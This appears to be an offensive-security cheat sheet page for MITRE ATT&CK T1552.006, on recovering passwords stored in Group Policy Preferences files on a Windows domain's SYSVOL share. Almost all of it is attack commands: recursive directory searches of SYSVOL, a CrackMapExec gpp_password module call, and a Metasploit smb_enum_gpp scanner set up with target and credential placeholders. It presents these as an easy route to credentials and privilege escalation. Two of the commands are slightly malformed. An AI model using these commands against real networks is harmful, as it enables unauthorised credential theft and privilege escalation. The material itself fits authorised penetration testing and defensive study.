---
description: MITRE ATT&CK, Credential Access, Sub-technique T1552.006
---

# Group Policy Preferences

### Description

Unsecured credentials in Group Policy Preferences (GPP) can be an easy way to obtain credentials and escalate privileges. GPP's are stored in SYSVOL on domain controllers. However, the real kicker is that any domain user can view the SYSVOL share, obtain the password, and decrypt it within seconds.

### Tactics

#### Enumerating Credentials Directly on the SYSVOL Share

```bash
dir /s * .xml
```

#### Enumerating Credentials Remotely from SYSVOL

```bash
dir /s \\[FQN]\SYSVOL\[FQDN\ | more
```

#### Enumerating Credentials using CrackMapExec

```bash
crackmapexec smb $ip -u $username -p $password -M gpp_password
```

#### Enumerating Credentials using Metasploit

```bash
use auxiliary/scanner/smb/smb_enum_gpp
set rhosts [IP_Addresses]
set SMBUser [USERNAME]
set SMBPass [PASSWORD]
```
